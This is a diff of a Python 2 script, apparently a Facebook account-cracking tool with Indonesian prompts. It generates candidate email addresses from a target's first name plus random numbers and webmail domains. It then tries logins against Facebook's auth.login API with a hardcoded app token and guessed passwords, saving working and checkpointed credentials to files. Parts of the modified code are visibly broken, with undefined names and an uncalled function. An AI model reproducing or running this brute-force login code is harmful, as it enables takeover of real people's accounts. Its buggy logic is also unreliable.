@@ -1,29 +1,7 @@
 #coding=utf-8
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
-dom = ["hotmail", "yahoo", "gmail"]
 os.system('rm -rf .txt')
-for n in range(2000):
-
-    user = random.randint(0, len(dom)-1)
-    
-    sys.stdout = open('.txt', 'a')
-
-    print(user)
-
-    sys.stdout.flush()
-    
-try:
-    import requests
-except ImportError:
-    os.system('pip2 install requests')
-    
-try:
-    import mechanize
-except ImportError:
-    os.system('pip2 install mechanize')
-    time.sleep(1)
-    os.system('python2 upil.py')
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -98,6 +76,21 @@ sucessful = []
 checkpoint = []
 cp = []
 ok = []
+nama = []
+dom = ["hotmail", "yahoo", "gmail"]
+numer = ["0", "1", "2", "3","4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22" "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90"]
+
+def get_one_random_domain(domains):
+        return domains[random.randint( 0, len(domains)-1)]
+
+def get_one_random_number(numer):
+        return numer[random.randint(0, len(numer)-1)]
+
+def em():
+    for i in range(0,2000):
+         one_number = str(get_one_random_number(numer))
+         one_domain = str(get_one_random_domain(domains))         
+         print(nama + one_number  + "@" + one_domain)
 
 
 def login():
@@ -108,8 +101,8 @@ def login():
 	print("\033[1;96m[+] \033[1;93mNama Depan FB Target \033[1;97m: ")
 	print 42*"\033[1;96m="
 	try:
-		c = raw_input("\033[1;96m[?] \033[1;93mMasukan Nama  \033[1;97m: ")
-		k="gmail"
+		nama = raw_input("\033[1;96m[?] \033[1;93mMasukan Nama  \033[1;97m: ")
+		em
 		idlist = ('.txt')
 		for line in open(idlist,"r").readlines():
 			id.append(line.strip())
@@ -132,45 +125,45 @@ def login():
 			
 	def main(arg):
 		global cpb,oks
-		user = arg
+		em = arg
 		try:
 			os.mkdir('save')
 		except OSError:
 			pass
 		try:
 			pass1
-			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +c+k+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + k +   ' | '  +  pass1
+				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass1
 				okb = open('save/successfull.txt', 'a')
-				okb.write(c+k+'|'+pass1+'\n')
+				okb.write(em+'|'+pass1+'\n')
 				okb.close()
-				oks.append(c+k+pass1)
+				oks.append(em+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + k +   ' | '  +  pass1
+					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass1
 					cps = open('save/checkpoint.txt', 'a')
-					cps.write(c+k+'|'+pass1+'\n')
+					cps.write(em+'|'+pass1+'\n')
 					cps.close()
-					cpb.append(c+k+pass1)
+					cpb.append(em+pass1)
 				else:
 					pass2 = pakistan
-					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +c+k+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + k +   ' | '  +  pass2
+						print '\x1b[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass2
 						okb = open('save/successfull.txt', 'a')
-						okb.write(c+k+'|'+pass2+'\n')
+						okb.write(em+'|'+pass2+'\n')
 						okb.close()
-						oks.append(c+k+pass2)
+						oks.append(em+pass2)
 					else:
 						if 'www.facebook.com' in q['error_msg']:
-							print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + k +   ' | '  +  pass2
+							print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + em +   ' | '  +  pass2
 							cps = open('save/checkpoint.txt', 'a')
-							cps.write(c+k+'|'+pass2+'\n')
+							cps.write(em+'|'+pass2+'\n')
 							cps.close()
-							cpb.append(c+k+pass2)
+							cpb.append(em+pass2)
 
 
 		
